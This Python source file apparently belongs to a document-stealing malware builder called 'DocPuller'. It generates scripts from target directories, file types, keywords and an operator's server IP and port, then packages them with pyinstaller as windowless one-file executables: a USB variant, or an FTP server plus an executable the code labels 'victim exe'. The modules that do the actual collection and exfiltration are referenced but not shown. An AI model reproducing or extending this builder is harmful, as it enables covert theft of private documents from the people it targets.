import subprocess


from constants.constatns import DOCPULLER_USB_PY_SCRIPT, DOCPULLER_FTP_SERVER_PY_SCRIPT, DOCPULLER_FTP_VICTIM_PY_SCRIPT
from file_generators.docpuller_script_generator import ScriptGen


class DocPullerGenerator:

    def __init__(self, save_dir, is_usb, direcoties, file_type, date, keywords, server_ip, server_port):
        self.save_dir = save_dir
        self.is_usb = is_usb
        self.direcoties = direcoties
        self.file_type = file_type
        self.date = date
        self.keywords = keywords
        self.server_ip = server_ip
        self.server_port = server_port

        self.command = [
            "pyinstaller",
            "--onefile",
            "--clean",
            "--noconsole",
            f"--distpath={self.save_dir}"
        ]

        ScriptGen(is_usb, direcoties, file_type, date, keywords, server_ip, server_port).write_to_file()


    def main(self):
        if self.is_usb:
            print('generating usb exe...')

            command = self.command + [DOCPULLER_USB_PY_SCRIPT]
            execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                       universal_newlines=True)
            execute.communicate()
            print('Done!')

        else:
            print('generating server exe...')

            command = self.command + [DOCPULLER_FTP_SERVER_PY_SCRIPT]
            execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                       universal_newlines=True)
            execute.communicate()

            print('generating victim exe...')

            command = self.command + [DOCPULLER_FTP_VICTIM_PY_SCRIPT]
            execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                       universal_newlines=True)
            execute.communicate()

            print('Done!')
